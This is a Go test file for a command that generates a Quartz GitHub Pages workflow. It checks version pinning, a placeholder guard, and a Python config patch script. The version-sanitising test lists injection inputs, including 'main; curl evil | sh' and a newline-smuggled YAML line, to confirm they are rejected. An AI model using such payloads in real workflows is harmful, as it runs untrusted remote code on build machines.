// SPDX-License-Identifier: EUPL-1.2

package initcmd

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func workflow(t *testing.T, version string) string {
	t.Helper()
	for _, f := range Files([]Tool{Quartz}, "demo", version) {
		if f.Path == ".github/workflows/pages.yml" {
			return f.Content
		}
	}
	t.Fatal("no workflow")
	return ""
}

func TestWorkflowVersion(t *testing.T) {
	for in, want := range map[string]string{
		"v1.2.3":                                   "v1.2.3",
		"v0.0.0-20261021120000-0123456789ab":       "v0.0.0-20261021120000-0123456789ab",
		"0123456789abcdef0123456789abcdef01234567": "0123456789abcdef0123456789abcdef01234567",
		"":                     VersionPlaceholder,
		"(devel)":              VersionPlaceholder,
		"main; curl evil | sh": VersionPlaceholder,
		"v1\nuses: x":          VersionPlaceholder,
		"-flag":                VersionPlaceholder,
	} {
		if got := WorkflowVersion(in); got != want {
			t.Errorf("WorkflowVersion(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestWorkflowPinsTheVersionOrFailsLoudly(t *testing.T) {
	known := workflow(t, "v1.2.3")
	if !strings.Contains(known, "CSCRIBE_VERSION: v1.2.3\n") || strings.Contains(known, "@main") {
		t.Errorf("pinned workflow:\n%s", known)
	}
	unknown := workflow(t, "")
	if !strings.Contains(unknown, "CSCRIBE_VERSION: "+VersionPlaceholder+"\n") {
		t.Errorf("placeholder missing:\n%s", unknown)
	}
	// Both cases carry the guard that stops a build while the placeholder is present.
	for _, w := range []string{known, unknown} {
		if !strings.Contains(w, "REPLACE_WITH_*)") || !strings.Contains(w, "exit 1") {
			t.Error("workflow lacks the placeholder guard")
		}
	}
}

const pinnedConfig = "../../testdata/quartz/quartz.config.ts"

// runPatch runs the workflow's patch script against the given quartz.config.ts
// text and settings.json text and returns the patched config and the outcome.
func runPatch(t *testing.T, config, settings string) (string, error, string) {
	t.Helper()
	py, err := exec.LookPath("python3")
	if err != nil {
		t.Skip("python3 not available")
	}
	dir := t.TempDir()
	for p, text := range map[string]string{"quartz/quartz.config.ts": config, ".quartz/settings.json": settings} {
		_ = os.MkdirAll(filepath.Join(dir, filepath.Dir(p)), 0o755)
		if err := os.WriteFile(filepath.Join(dir, p), []byte(text), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	cmd := exec.Command(py, "-I", "-c", quartzPatch)
	cmd.Dir = dir
	out, err := cmd.CombinedOutput()
	b, _ := os.ReadFile(filepath.Join(dir, "quartz", "quartz.config.ts"))
	return string(b), err, string(out)
}

func TestQuartzPatch(t *testing.T) {
	raw, err := os.ReadFile(pinnedConfig)
	if err != nil {
		t.Fatal(err)
	}
	config := string(raw)
	t.Run("applies the settings literally", func(t *testing.T) {
		got, err, out := runPatch(t, config, `{"pageTitle": "a $& \\1 \"q\"", "baseUrl": "me.github.io/notes", "analytics": null}`)
		if err != nil {
			t.Fatalf("%v %s", err, out)
		}
		for _, want := range []string{`pageTitle: "a $& \\1 \"q\""`, `baseUrl: "me.github.io/notes"`, "analytics: null,"} {
			if !strings.Contains(got, want) {
				t.Errorf("patched config lacks %s:\n%s", want, got)
			}
		}
		if strings.Contains(got, "plausible") || strings.Contains(got, "Quartz 4\"") {
			t.Errorf("old values remain:\n%s", got)
		}
	})
	t.Run("the placeholder baseUrl fails", func(t *testing.T) {
		_, err, out := runPatch(t, config, `{"pageTitle": "x", "baseUrl": "<owner>.github.io/<repo>", "analytics": null}`)
		if err == nil || !strings.Contains(out, "placeholder") {
			t.Errorf("err %v out %s", err, out)
		}
	})
	for name, broken := range map[string]string{
		"no pageTitle":   strings.Replace(config, `pageTitle: "Quartz 4"`, `title: "x"`, 1),
		"no baseUrl":     strings.Replace(config, `baseUrl: "quartz.jzhao.xyz"`, ``, 1),
		"no analytics":   strings.Replace(config, "analytics: {\n      provider: \"plausible\",\n    },", "", 1),
		"two baseUrl":    config + "\n  baseUrl: \"again\",\n",
		"two pageTitles": config + "\n  pageTitle: \"again\",\n",
	} {
		t.Run(name, func(t *testing.T) {
			if broken == config {
				t.Fatal("test fixture did not change")
			}
			_, err, out := runPatch(t, broken, `{"pageTitle": "x", "baseUrl": "me.github.io/n", "analytics": null}`)
			if err == nil || !strings.Contains(out, "exactly once") {
				t.Errorf("err %v out %s", err, out)
			}
		})
	}
}
